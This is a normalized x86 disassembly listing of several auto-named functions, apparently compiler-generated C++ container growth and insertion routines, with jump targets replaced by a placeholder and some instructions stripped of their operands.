mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push edx
mov ebp eax
mov eax [ esi + 0x4 ]
push esi
lea edx [ ebp + edi * 4 ]
lea ecx [ eax + ecx * 4 ]
push edx
lea eax [ eax + edi * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x18
cmp edi ebx
ja r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + ebx * 4 ]
push eax
push ecx
call sub_453050
mov eax [ esi + 0x4 ]
mov [ esp + 0x28 ] 0x0
mov edx [ esp + 0x28 ]
push edx
push esi
lea ecx [ eax + edi * 4 ]
push ebp
lea eax [ eax + ebx * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esp + 0x3c ]
push ecx
push esi
lea edx [ esp + 0x44 ]
push edx
push ebx
push eax
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + edi * 4 ]
push eax
push ecx
call sub_453050
mov ecx [ esp + 0x28 ]
push ecx
push esi
lea edx [ esp + 0x30 ]
push edx
mov ecx ebx
sub ecx edi
push ecx
push eax
call sub_420d80
mov [ esp + 0x3c ] 0x0
mov edx [ esp + 0x3c ]
push edx
push esi
lea eax [ esp + 0x44 ]
push eax
push edi
push ebp
jmp r-xdata
mov ebx eax
call sub_420d80
mov eax [ esi + 0x4 ]
add esp 0x3c
push eax
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
add eax ebx
pop edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
retn 0x4
sub_468050
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x3fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 4 ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_465430
sub_4680b0
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi edx
mov dl [ eax + 0x15 ]
test dl dl
mov [ esp + 0x8 ] 0x1
jne r-xdata
mov eax [ esp + 0x8 ]
push ebp
push esi
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_4654b0
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
pop ecx
retn 0x8
push edi
mov edi [ ebp ]
nop
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
cmp edi [ eax + 0xc ]
setl dl
test dl dl
mov esi eax
mov [ esp + 0xc ] dl
je r-xdata
pop edi
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
sub_468120
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0b98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ eax ]
test edi edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x14 ] edi
je r-xdata
mov [ ebp + 0x10 ] edi
mov edx [ esi + 0x4 ]
test edx edx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi + 0xd48 ]
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
test edi edi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
dec [ edi + 0xd48 ]
jne r-xdata
mov edi [ esi + 0x8 ]
sub edi edx
sar edi 0x2
xor edi edi
jmp r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
test edx edx
jne r-xdata
mov ecx esi
call sub_465430
mov ebx 0x3fffffff
sub ebx edi
cmp ebx ecx
jae r-xdata
mov edi [ esi + 0x8 ]
sub edi edx
sar edi 0x2
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax ecx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x3fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi ecx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] ebx
shl ecx 0x2
mov eax ebx
sub eax ecx
mov edx esp
mov [ ebp - 0x18 ] ecx
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0xc ] eax
mov [ edx ] eax
call sub_461c30
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_460470
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp - 0x18 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ ecx * 4 ]
mov [ ebp - 0x18 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x24 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x24 ] esp
mov [ eax ] edi
call sub_461c30
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_462d20
mov ebx [ esi + 0x8 ]
mov eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x10 ]
add ebx eax
mov [ esi + 0x8 ] ebx
push ecx
mov esi ebx
push ecx
mov ecx esp
sub esi eax
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] esi
jmp r-xdata
add eax edi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_45f2f0
add esp 0xc
mov edi [ esi + 0x8 ]
sub edi edx
sar edi 0x2
xor edi edi
jmp r-xdata
test edx edx
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x20 ] eax
call sub_4b573e
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov edi eax
mov eax [ esi + 0x4 ]
push esi
push edi
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] eax
call sub_4616d0
mov edx [ ebp + 0xc ]
add esp 0x14
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push ebx
mov [ ebp - 0x18 ] ebx
call sub_461b00
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ ebx + eax * 4 ]
push esi
push eax
push ecx
mov [ ebp - 0x18 ] eax
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_4616d0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
test edx edx
jne r-xdata
add edi ecx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax edi
lea ecx [ edi + ebx * 4 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edi
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push esi
push eax
push ecx
call sub_461b30
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov ebx [ ebp + 0xc ]
add ebx eax
test ecx ecx
je r-xdata
add eax ecx
mov edi [ ebp - 0x14 ]
sub_468440
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_4607d0
add esi 0x20
cmp esi edi
jne r-xdata
sub_468470
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0bd0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx [ esi + 0x4 ]
test ebx ebx
mov eax [ eax + 0x8 ]
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx edx
xor ecx ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx esi
call sub_465430
mov eax 0x15555555
sub eax edx
cmp eax edi
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov edx ecx
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
cmp edx edi
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax ecx
shr eax 0x1
mov edx 0x15555555
sub edx eax
cmp edx ecx
jae r-xdata
add edx edi
cmp ecx edx
jae r-xdata
push ecx
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
lea edi [ edi + edi * 2 ]
shl edi 0x2
sub ecx edi
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_4615e0
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ eax ] ecx
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] ebx
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_4604f0
add esp 0x10
lea ecx [ ebp - 0x1c ]
push ecx
push ecx
mov eax esp
add edi ebx
mov [ eax ] edi
lea eax [ edi + edi * 2 ]
shl eax 0x2
mov [ ebp + 0x8 ] eax
add eax ebx
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] ebx
call sub_4615e0
mov ecx [ esi + 0x8 ]
lea edx [ ebp - 0x1c ]
push edx
mov edx ecx
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
sub edi edx
push edi
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461950
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x1c ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
call sub_4604b0
add esp 0xc
mov edx [ esi + 0x8 ]
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
lea ebx [ ecx + ecx * 2 ]
shl ebx 0x2
push ebx
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x0
mov [ eax ] ecx
call sub_45f5e0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x1c ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_4606a0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + edi * 2 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ esi + 0x8 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f5e0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
mov ecx esi
call sub_45d880
mov ecx eax
add ecx edi
add edx edi
cmp ecx edx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
lea ecx [ edi + edi * 2 ]
add ebx eax
lea edx [ eax + ecx * 4 ]
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add edi edx
test ecx ecx
je r-xdata
sub_468770
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0be0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xe0
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov ebx ecx
mov ecx 0x37
lea edi [ ebp - 0xec ]
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov esi edx
xor esi esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx ebx
call sub_465430
mov eax 0x129e412
sub eax edx
cmp eax edi
jae r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov esi [ ebp + 0x8 ]
mov edx ecx
sub edx esi
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
cmp edx edi
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax esi
shr eax 0x1
mov edx 0x129e412
sub edx eax
cmp edx esi
jae r-xdata
add edx edi
cmp esi edx
jae r-xdata
push ecx
imul edi edi 0xdc
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx edi
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx ebx
call sub_461610
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ eax ] ecx
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] esi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_460570
add esp 0x10
lea ecx [ ebp - 0xec ]
push ecx
push ecx
mov eax esp
add edi esi
mov [ eax ] edi
mov eax edi
imul eax eax 0xdc
mov [ ebp + 0x8 ] eax
add eax esi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx ebx
mov [ ebp + 0x10 ] esp
mov [ eax ] esi
call sub_461610
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0xec ]
push edx
mov edx ecx
sub edx esi
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
sub edi edx
push edi
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_461980
mov edx [ ebx + 0x8 ]
mov ecx [ ebp + 0x8 ]
add edx ecx
mov [ ebx + 0x8 ] edx
mov ebx edx
lea edx [ ebp - 0xec ]
push edx
push ecx
mov eax esp
sub ebx ecx
mov [ eax ] ebx
jmp r-xdata
add esi eax
xor esi esi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] esi
mov [ ebp + 0x8 ] esp
call sub_45f340
add esp 0xc
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
imul esi esi 0xdc
push esi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ ebx + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push ebx
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x0
mov [ eax ] ecx
call sub_45f620
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push ebx
lea edx [ ebp - 0xec ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_4606e0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax edi
imul eax eax 0xdc
add esp 0x14
add ecx eax
mov eax [ ebx + 0x8 ]
push edx
push ebx
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f620
mov ecx [ ebx + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
mov ecx ebx
call sub_45d8a0
mov esi eax
add esi edi
add edx edi
cmp esi edx
jae r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul edi edi 0xdc
add esi eax
add edi eax
mov [ ebx + 0xc ] esi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add edi edx
test ecx ecx
je r-xdata
sub_468a90
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0bf0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1a4
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov ebx ecx
mov ecx 0x68
lea edi [ ebp - 0x1b0 ]
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
mov esi edx
xor esi esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx ebx
call sub_465430
mov eax 0x9d89d8
sub eax edx
cmp eax edi
jae r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov esi [ ebp + 0x8 ]
mov edx ecx
sub edx esi
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
cmp edx edi
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax esi
shr eax 0x1
mov edx 0x9d89d8
sub edx eax
cmp edx esi
jae r-xdata
add edx edi
cmp esi edx
jae r-xdata
push ecx
imul edi edi 0x1a0
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx edi
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx ebx
call sub_461640
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ eax ] ecx
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] esi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_4605f0
add esp 0x10
lea ecx [ ebp - 0x1b0 ]
push ecx
push ecx
mov eax esp
add edi esi
mov [ eax ] edi
mov eax edi
imul eax eax 0x1a0
mov [ ebp + 0x8 ] eax
add eax esi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx ebx
mov [ ebp + 0x10 ] esp
mov [ eax ] esi
call sub_461640
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x1b0 ]
push edx
mov edx ecx
sub edx esi
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
sub edi edx
push edi
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_4619b0
mov edx [ ebx + 0x8 ]
mov ecx [ ebp + 0x8 ]
add edx ecx
mov [ ebx + 0x8 ] edx
mov ebx edx
lea edx [ ebp - 0x1b0 ]
push edx
push ecx
mov eax esp
sub ebx ecx
mov [ eax ] ebx
jmp r-xdata
add esi eax
xor esi esi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] esi
mov [ ebp + 0x8 ] esp
call sub_45f370
add esp 0xc
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
imul esi esi 0x1a0
push esi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ ebx + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push ebx
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x0
mov [ eax ] ecx
call sub_45f660
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push ebx
lea edx [ ebp - 0x1b0 ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_460710
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax edi
imul eax eax 0x1a0
add esp 0x14
add ecx eax
mov eax [ ebx + 0x8 ]
push edx
push ebx
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f660
mov ecx [ ebx + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
mov ecx ebx
call sub_45d8d0
mov esi eax
add esi edi
add edx edi
cmp esi edx
jae r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul edi edi 0x1a0
add esi eax
add edi eax
mov [ ebx + 0xc ] esi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add edi edx
test ecx ecx
je r-xdata
sub_468db0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0c11
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x30
call sub_4b573e
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_4331f0
sub_468e40
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0c20
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov cl [ eax ]
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x13 ] cl
jne r-xdata
mov ecx [ esi + 0xc ]
sub ecx eax
mov [ ebp - 0x14 ] ecx
mov ebx ecx
xor ebx ebx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
test eax eax
jne r-xdata
mov ecx esi
call sub_465430
or edi 0xffffffff
sub edi ecx
cmp edi edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov ecx ebx
sub ecx edi
cmp ecx edx
jae r-xdata
mov ecx ebx
shr ecx 0x1
or edi 0xffffffff
sub edi ecx
cmp edi ebx
jae r-xdata
add ecx edx
cmp ebx ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
push ecx
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0x8 ] esp
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_461670
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push edx
mov [ eax ] edi
call sub_460630
add esp 0x10
lea eax [ ebp + 0x13 ]
push eax
push ecx
mov ecx [ ebp + 0xc ]
mov eax esp
lea edx [ edi + ecx ]
mov [ ebp + 0x8 ] esp
mov [ eax ] edx
add edx edi
push edx
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp + 0x8 ] esp
mov [ eax ] edi
call sub_461670
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edx edi
